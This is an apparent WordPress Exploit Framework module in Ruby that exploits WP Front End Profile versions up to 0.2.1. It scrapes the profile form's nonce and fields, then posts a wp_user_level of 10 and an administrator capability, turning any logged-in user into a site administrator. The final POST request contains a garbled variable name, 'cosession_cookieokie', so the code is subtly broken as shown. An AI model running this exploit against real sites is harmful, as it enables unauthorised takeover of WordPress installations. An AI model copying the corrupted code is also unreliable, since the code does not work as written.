# frozen_string_literal: true

class Wpxf::Auxiliary::WpFrontEndProfilePrivilegeEscalation < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'WP Front End Profile <= 0.2.1 Privilege Escalation',
      desc: %(
        The WP Front End Profile plugin, in versions <= 0.2.1, allows authenticated
        users of any user level to escalate their user role to an administrator.
      ),
      author: [
        'rastating' # WPXF module
      ],
      references: [
        ['WPVDB', '8620']
      ],
      date: 'Sep 15 2016'
    )

    register_options([
      StringOption.new(
        name: 'profile_form_path',
        desc: 'The path to the page containing the profile editor form',
        required: true
      )
    ])
  end

  def check
    check_plugin_version_from_readme('wp-front-end', '0.2.2')
  end

  def requires_authentication
    true
  end

  def profile_form_url
    normalize_uri(full_uri, datastore['profile_form_path'])
  end

  def fetch_profile_form
    res = nil

    scoped_option_change('follow_http_redirection', true) do
      res = execute_get_request(url: profile_form_url, cookie: session_cookie)
    end

    res
  end

  def form_fields_with_default_values
    res = fetch_profile_form
    return nil unless res && res.code == 200

    fields = {}
    res.body.scan(/<input.+?name="(.+?)".+?value="(.*?)".*?>/i) do |match|
      if match[0].start_with?('wpfep_nonce_name', '_wp_http_referer', 'profile[')
        emit_info "Found field #{match[0]}", true
        fields[match[0]] = match[1]
      end
    end

    fields
  end

  def run
    return false unless super

    emit_info 'Requesting profile editor form...'
    form_fields = form_fields_with_default_values

    if form_fields.nil?
      emit_error 'Failed to retrieve the profile form'
      return false
    end

    form_fields['profile[wp_user_level]'] = 10
    form_fields['profile[wp_capabilities][administrator]'] = 1
    form_fields['profile[wpfep_save]'] = 'Update Profile'

    emit_info 'Elevating privileges...'
    execute_post_request(
      url: profile_form_url,
      cookie: cosession_cookieokie,
      body: form_fields
    )
  end
end
